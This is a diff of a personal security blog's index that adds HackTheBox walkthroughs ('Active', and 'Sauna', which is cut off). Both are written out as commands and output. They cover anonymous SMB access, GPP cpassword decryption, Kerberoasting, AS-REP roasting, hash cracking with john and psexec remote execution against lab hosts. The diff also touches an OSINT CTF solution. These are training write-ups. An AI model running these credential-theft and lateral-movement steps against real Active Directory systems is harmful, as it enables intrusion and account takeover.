@@ -377,7 +377,7 @@
 <h3 id="cartesian-2"><a href="#cartesian-2" class="headerlink" title="cartesian-2"></a>cartesian-2</h3><ul>
 <li>solver Elliot_404<br>上LinkedIn搜尋Terrence Descartes，會看到一個跟前面Instagram帳號同樣頭像的，點下去<br><a href="https://www.linkedin.com/in/terrence-descartes-54642831a/">https://www.linkedin.com/in/terrence-descartes-54642831a/</a><br>查看第一則貼文的第二張照片，裡面有寫flag(2&#x2F;1)<br><img src="https://hackmd.io/_uploads/ryuHquo_C.jpg" alt="1721434962084"></li>
 </ul>
-<p>利用<a href="https://epieos.com/">epieos</a>搜尋<a href="mailto:&#x74;&#101;&#x72;&#x72;&#x65;&#110;&#x63;&#101;&#x64;&#101;&#115;&#x63;&#97;&#114;&#116;&#101;&#115;&#64;&#103;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#x6d;">&#x74;&#101;&#x72;&#x72;&#x65;&#110;&#x63;&#101;&#x64;&#101;&#115;&#x63;&#97;&#114;&#116;&#101;&#115;&#64;&#103;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#x6d;</a>(用姓名猜出來的)<br>Google Calendar右邊的連結點進去<br><a href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>題目說要觀察他去年夏天旅行，所以前往2023年6月，會看到SUMMER TRIP!!!，點下去就能看到flag(2&#x2F;2)了<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
+<p>利用<a href="https://epieos.com/">epieos</a>搜尋<a href="mailto:&#x74;&#101;&#114;&#x72;&#x65;&#x6e;&#99;&#x65;&#100;&#101;&#x73;&#99;&#97;&#114;&#x74;&#101;&#115;&#64;&#103;&#x6d;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#109;">&#x74;&#101;&#114;&#x72;&#x65;&#x6e;&#99;&#x65;&#100;&#101;&#x73;&#99;&#97;&#114;&#x74;&#101;&#115;&#64;&#103;&#x6d;&#x61;&#x69;&#108;&#x2e;&#99;&#x6f;&#109;</a>(用姓名猜出來的)<br>Google Calendar右邊的連結點進去<br><a href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>題目說要觀察他去年夏天旅行，所以前往2023年6月，會看到SUMMER TRIP!!!，點下去就能看到flag(2&#x2F;2)了<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
 <h3 id="cartesian-3"><a href="#cartesian-3" class="headerlink" title="cartesian-3"></a>cartesian-3</h3><ul>
 <li>solver Elliot_404<blockquote>
 <p><a href="http://cartesian.chal.imaginaryctf.org/">http://cartesian.chal.imaginaryctf.org/</a></p>
@@ -385,7 +385,7 @@
 </li>
 </ul>
 <ol>
-<li><p>What is your email?<br>A: <a href="mailto:&#x74;&#101;&#x72;&#114;&#101;&#110;&#x63;&#101;&#x64;&#x65;&#x73;&#99;&#x61;&#114;&#x74;&#x65;&#115;&#64;&#103;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#x6d;">&#x74;&#101;&#x72;&#114;&#101;&#110;&#x63;&#101;&#x64;&#x65;&#x73;&#99;&#x61;&#114;&#x74;&#x65;&#115;&#64;&#103;&#109;&#x61;&#x69;&#x6c;&#x2e;&#99;&#111;&#x6d;</a><br>用姓名去猜即可</p>
+<li><p>What is your email?<br>A: <a href="mailto:&#116;&#x65;&#114;&#x72;&#101;&#110;&#x63;&#x65;&#100;&#101;&#x73;&#x63;&#97;&#x72;&#116;&#x65;&#x73;&#64;&#x67;&#109;&#x61;&#105;&#108;&#46;&#x63;&#x6f;&#x6d;">&#116;&#x65;&#114;&#x72;&#101;&#110;&#x63;&#x65;&#100;&#101;&#x73;&#x63;&#97;&#x72;&#116;&#x65;&#x73;&#64;&#x67;&#109;&#x61;&#105;&#108;&#46;&#x63;&#x6f;&#x6d;</a><br>用姓名去猜即可</p>
 </li>
 <li><p>On what day were you born? (YYYY-MM-DD)<br>A: 2001-01-18<br>此篇<a href="https://www.instagram.com/p/C9lkBOjxQCW/">Instagram貼文</a>是他的半歲生日慶祝文，用發文日期減去6個月後即是他的生日，年份的部分則在名稱中就透露了</p>
 </li>
@@ -1467,6 +1467,22 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>金盾獎 2023 心得文</title>
+    <url>/2023/11/25/csc2023/</url>
+    <content><![CDATA[<p>Team Name:RestOrPwn<br>Rank:2  </p>
+<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這次能在這場比賽拿第二真的好開心，也感謝我的隊友Grasping631和同學ccwt一起陪我玩 &gt;&lt;  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><p>本來有點懶得寫orz，不過今天早上看到學弟yoni問我會不會有wp，心情沉澱一下之後還是決定來寫啦~~~<br>開賽前本來想說這次拿個潛力獎可以去特選就很棒ㄌ&gt;&lt;，結果開賽一直到兩小時後我們進去打情境題的時候就只有我戳出的一題目CVE任意檔案讀取漏洞，就感覺有點涼&#x3D; &#x3D; (我甚至沒把另一個標示簡單的SQL Injection登入繞過解出來，超笨)<br>結果今年情境題我們是抽到一個門禁系統，你要在三十分鐘內成功複製貼在桌上的卡片資訊，結果我們在等待時間查的資訊意外的有幫助，最後各種混亂下互相配合成功破譯並複製內容，這時候就有點小小的被振奮到，也決定回去好好看看其他題目。<br>下午回來看了一下題目，發現逆向工程或者惡意封包分析的藍隊東東我根本就沒頭緒，我目光就鎖定在一個標示難的國小網站，簡單RECON一下之後發現一個隱藏的登入頁面，就在我沒頭緒的時候在旁邊玩得ccwt意外的發現帳號就是主頁上的公號，我就突然想到主頁pdf也有一個叫陳先生的人的公號，所以我就嘗試拿他的分機號碼當密碼登入就進到下一個頁面ㄌorz。之後就是各種IDOR和彩虹表攻擊就過ㄌ，然後我跑出去裝水意外看到score board發現我們第四名……<br>看完之後其實心有稍微放下來，就跑去看了 Grasping631 已經開好解答的題目，意外發現flag就base64編碼後放在解答最後就直接送ㄌ(O)，然後最後的時間就是我把ssh題目的程式碼讀完後逆一下解出+我們三個試著通靈出另一個開解答題目的flag。(然後這時候就關板ㄌQQ)  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>整場比賽的題目蠻有趣的，很貼近現實世界(跟一般的ctf競賽不一樣)，比較有趣的就是賽後出題者講到水熊蟲病毒封包的時候火藥味很濃XD，但我不會forensics聽的其實也不是很懂就是w。  </p>
+<p>回想起來好像真的不會後悔在高一下決定放棄競數以及高二的時候沒上能競，算是高中打比賽第一次有種努力值得的感覺吧，也給國中的自己一個交代ㄌ(應該啦…雖然國中有學資安但沒想過高中要比賽就是XDD  </p>
+<p>最後，再一次感謝我的隊友，以及在我情緒低潮時陪伴我的老師、學長、朋友和同學們，開導了我並讓我嘗試國中完全沒想過要走的路，並在這途中不斷扶持我，在日常中陪我各種耍笨，散心，真的很開心 &lt;3。  </p>
+<p>這場比賽表現很好，也更深刻發現自己還有好多要學 &gt;&lt; 繼續努力owobbbb  </p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>RestOrPwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Cyberlens on Tryhackme</title>
     <url>/2024/05/22/cyberlens-thm/</url>
     <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>I haven’t posted any pentesting write up recently.<br>It means that I trained my penetration skill hardly recently(but preparing school exams and reversing LOL), time to practice ~<br>Victim’s IP : 10.10.231.218<br>Victim’s Host : cyberlens.thm<br>Attacker’s IP : 10.9.195.189  </p>
@@ -1495,22 +1511,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>Pentesting</tag>
         <tag>Windows</tag>
         <tag>TryHackMe</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>金盾獎 2023 心得文</title>
-    <url>/2023/11/25/csc2023/</url>
-    <content><![CDATA[<p>Team Name:RestOrPwn<br>Rank:2  </p>
-<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這次能在這場比賽拿第二真的好開心，也感謝我的隊友Grasping631和同學ccwt一起陪我玩 &gt;&lt;  </p>
-<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><p>本來有點懶得寫orz，不過今天早上看到學弟yoni問我會不會有wp，心情沉澱一下之後還是決定來寫啦~~~<br>開賽前本來想說這次拿個潛力獎可以去特選就很棒ㄌ&gt;&lt;，結果開賽一直到兩小時後我們進去打情境題的時候就只有我戳出的一題目CVE任意檔案讀取漏洞，就感覺有點涼&#x3D; &#x3D; (我甚至沒把另一個標示簡單的SQL Injection登入繞過解出來，超笨)<br>結果今年情境題我們是抽到一個門禁系統，你要在三十分鐘內成功複製貼在桌上的卡片資訊，結果我們在等待時間查的資訊意外的有幫助，最後各種混亂下互相配合成功破譯並複製內容，這時候就有點小小的被振奮到，也決定回去好好看看其他題目。<br>下午回來看了一下題目，發現逆向工程或者惡意封包分析的藍隊東東我根本就沒頭緒，我目光就鎖定在一個標示難的國小網站，簡單RECON一下之後發現一個隱藏的登入頁面，就在我沒頭緒的時候在旁邊玩得ccwt意外的發現帳號就是主頁上的公號，我就突然想到主頁pdf也有一個叫陳先生的人的公號，所以我就嘗試拿他的分機號碼當密碼登入就進到下一個頁面ㄌorz。之後就是各種IDOR和彩虹表攻擊就過ㄌ，然後我跑出去裝水意外看到score board發現我們第四名……<br>看完之後其實心有稍微放下來，就跑去看了 Grasping631 已經開好解答的題目，意外發現flag就base64編碼後放在解答最後就直接送ㄌ(O)，然後最後的時間就是我把ssh題目的程式碼讀完後逆一下解出+我們三個試著通靈出另一個開解答題目的flag。(然後這時候就關板ㄌQQ)  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>整場比賽的題目蠻有趣的，很貼近現實世界(跟一般的ctf競賽不一樣)，比較有趣的就是賽後出題者講到水熊蟲病毒封包的時候火藥味很濃XD，但我不會forensics聽的其實也不是很懂就是w。  </p>
-<p>回想起來好像真的不會後悔在高一下決定放棄競數以及高二的時候沒上能競，算是高中打比賽第一次有種努力值得的感覺吧，也給國中的自己一個交代ㄌ(應該啦…雖然國中有學資安但沒想過高中要比賽就是XDD  </p>
-<p>最後，再一次感謝我的隊友，以及在我情緒低潮時陪伴我的老師、學長、朋友和同學們，開導了我並讓我嘗試國中完全沒想過要走的路，並在這途中不斷扶持我，在日常中陪我各種耍笨，散心，真的很開心 &lt;3。  </p>
-<p>這場比賽表現很好，也更深刻發現自己還有好多要學 &gt;&lt; 繼續努力owobbbb  </p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>RestOrPwn</tag>
       </tags>
   </entry>
   <entry>
@@ -2256,6 +2256,50 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>Active on HackTheBox</title>
+    <url>/2024/12/25/htb-active/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Victim’s IP : 10.10.10.100<br>Victim’s Host : *.active.htb<br>Attacker’s IP : 10.10.14.14  </p>
+<h2 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h2><h3 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h3><p><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.10.100 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-12-22 08:51:28Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49164/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49174/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49175/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2:1:0: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| p2p-conficker: </span><br><span class="line">|   Checking <span class="keyword">for</span> Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 40109/tcp): CLEAN (Couldn<span class="string">&#x27;t connect)</span></span><br><span class="line"><span class="string">|   Check 2 (port 39290/tcp): CLEAN (Couldn&#x27;</span>t connect)</span><br><span class="line">|   Check 3 (port 38631/udp): CLEAN (Failed to receive data)</span><br><span class="line">|   Check 4 (port 25854/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2024-12-22T08:52:35</span><br><span class="line">|_  start_date: 2024-12-22T08:48:16</span><br><span class="line">|_clock-skew: -7h52m31s</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>一樣是常見的 Domain Controller，<del>只是版本比較老但不能打 qq</del><br>smb, ldap, kerberos, winrpc…  </p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Anonymous-login-to-SMB"><a href="#Anonymous-login-to-SMB" class="headerlink" title="Anonymous login to SMB"></a>Anonymous login to SMB</h3><p>嘗試不使用帳號密碼登入 Samba<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L //10.10.10.100/ -N</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        NETLOGON        Disk      Logon server share </span><br><span class="line">        Replication     Disk      </span><br><span class="line">        SYSVOL          Disk      Logon server share </span><br><span class="line">        Users           Disk      </span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>
+<p>可以無帳密登入！<br>以 crackmapexec 輔助爬取並下載檔案  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.100 -u <span class="string">&#x27;&#x27;</span> -p <span class="string">&#x27;&#x27;</span> -M spider_plus -o READ_ONLY=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<h3 id="gpp-decrypt"><a href="#gpp-decrypt" class="headerlink" title="gpp decrypt"></a>gpp decrypt</h3><p>發現 <code>Replication/active.htb/Policies/&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;/MACHINE/Preferences/Groups/Groups.xml</code> 檔案：  </p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Groups</span> <span class="attr">clsid</span>=<span class="string">&quot;&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">User</span> <span class="attr">clsid</span>=<span class="string">&quot;&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;active.htb\SVC_TGS&quot;</span> <span class="attr">image</span>=<span class="string">&quot;2&quot;</span> <span class="attr">changed</span>=<span class="string">&quot;2018-07-18 20:46:06&quot;</span> <span class="attr">uid</span>=<span class="string">&quot;&#123;EF57DA28-5F69-4530-A59E-AAB58578219D&#125;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">Properties</span> <span class="attr">action</span>=<span class="string">&quot;U&quot;</span> <span class="attr">newName</span>=<span class="string">&quot;&quot;</span> <span class="attr">fullName</span>=<span class="string">&quot;&quot;</span> <span class="attr">description</span>=<span class="string">&quot;&quot;</span> <span class="attr">cpassword</span>=<span class="string">&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;</span> <span class="attr">changeLogon</span>=<span class="string">&quot;0&quot;</span> <span class="attr">noChange</span>=<span class="string">&quot;1&quot;</span> <span class="attr">neverExpires</span>=<span class="string">&quot;1&quot;</span> <span class="attr">acctDisabled</span>=<span class="string">&quot;0&quot;</span> <span class="attr">userName</span>=<span class="string">&quot;active.htb\SVC_TGS&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">User</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Groups</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>將 cpassword 段落取出，以 gpp-decrypt 做密碼破解：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gpp-decrypt <span class="string">&#x27;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>取得密碼：GPPstillStandingStrong2k18<br>再次以 svc_tgs 身分使用一次 crackmapexec 就可以獲得 Users 下的 user.txt  </p>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>先用 bloodhound 做 RECON  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bloodhound-python -c All -u <span class="string">&#x27;SVC_TGS&#x27;</span> -p <span class="string">&#x27;GPPstillStandingStrong2k18&#x27;</span> -d active.htb -ns 10.10.10.100 --zip</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/rk5LO5SB1x.png" alt="image"><br>注意到 Administrator 帳號設有 spn，代表它可視為一個服務帳號，利用 GetUserSPNs 可以對它進行請求，又因為 TGS-REP 是用服務的帳號 HASH 進行簽名，就可以獲得它的 TGS 進行本地爆破  </p>
+<p>先取得 SVC_TGS 的 TGT  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-getTGT active.htb/<span class="string">&#x27;svc_tgs&#x27;</span>:<span class="string">&#x27;GPPstillStandingStrong2k18&#x27;</span></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=svc_tgs.ccache</span><br></pre></td></tr></table></figure>
+<p>最後利用剛剛取得的 TGT 對admin進行請求(以 GetUserSPNs 腳本完成)  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip 10.10.10.100 -request -k -usersfile userlist.txt active.htb/</span><br></pre></td></tr></table></figure>
+<p>最後把拿到的 Administrator TGS 丟進去 john 爆破：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john <span class="built_in">hash</span> --wordlist=/home/kali/rockyou.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/HJgPKqSH1g.png" alt="image"><br>一樣，再次 crackmapexec 即可拿到 root flag  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>生為一個 Hacker，不 get shell 能開心嗎???<br>利用 impacket-psexec，搭配 admin 權限就可以寫入 exe 做到 RCE!  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/BkW725HSye.png" alt="image">  </p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>AD</tag>
+        <tag>Active Directory</tag>
+        <tag>Windows</tag>
+        <tag>HackTheBox</tag>
+        <tag>gpp-decrypt</tag>
+        <tag>GetUserSPNs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Administrator on HackTheBox</title>
     <url>/2024/12/07/htb-administrator/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="WRONG PASSWORD!!!." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
@@ -2417,6 +2461,46 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       <tags>
         <tag>Pentesting</tag>
         <tag>HackTheBox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Sauna on HackTheBox</title>
+    <url>/2024/12/25/htb-sauna/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Victim’s IP : 10.10.10.175<br>Victim’s Host : *.EGOTISTICAL-BANK.LOCAL<br>Attacker’s IP : 10.10.14.14  </p>
+<h2 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h2><h3 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h3><p><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.10.175 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: Egotistical Bank :: Home</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-12-22 21:12:36Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49676/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49689/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49697/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| p2p-conficker: </span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 35558/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 26043/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 57297/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 28932/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">|_clock-skew: 8h00m06s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-12-22T21:13:32</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br></pre></td></tr></table></figure>
+<p>拿到域名 EGOTISTICAL-BANK.LOCAL，除了常見的 smb, ldap, winrpc 外也很神奇地開了個 web  </p>
+<h3 id="Username-Gathering"><a href="#Username-Gathering" class="headerlink" title="Username Gathering"></a>Username Gathering</h3><p>進去 <code>http://egotistical-bank.local/about.html</code> 發現六個員工名字，以 <a href="https://github.com/urbanadventurer/username-anarchy/tree/master">username-anarchy<br>(link)</a> 生成可能的使用者名稱做下一步利用：<br><img src="https://hackmd.io/_uploads/r1PPfcBSJe.png" alt="image">  </p>
+<p><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username-anarchy -i possible.txt &gt; userlist.txt</span><br></pre></td></tr></table></figure>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>先利用 kerbrute 進行使用者名稱爆破：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 userlist.txt</span><br></pre></td></tr></table></figure>
+<p>最後獲得 fsmith 為可用帳號，利用 GetNPUsers 工具嘗試發現它不須預驗證  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-GetNPUsers -dc-ip 10.10.10.175 -request -usersfile userlist.txt EGOTISTICAL-BANK.LOCAL/</span><br></pre></td></tr></table></figure>
+<p>將取得的 TGT 丟給 john 爆破，即可獲得 fsmith 的密碼為 Thestrokes23<br>最後利用 evil-winrm 進行登入：  </p>
